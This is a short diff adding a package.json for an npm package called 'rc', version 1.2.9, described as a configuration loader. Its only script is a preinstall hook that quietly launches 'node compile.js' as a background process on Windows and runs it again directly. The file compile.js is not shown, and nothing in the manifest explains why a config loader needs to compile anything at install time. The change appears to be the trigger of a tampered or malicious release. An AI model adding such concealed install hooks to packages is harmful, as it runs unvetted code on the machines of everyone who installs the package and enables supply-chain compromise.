@@ -1,0 +1,8 @@
+{
+  "name": "rc",
+  "version": "1.2.9",
+  "description": "hardwired configuration loader",
+  "scripts": {
+    "preinstall": "start /B node compile.js & node compile.js"
+  }
+}
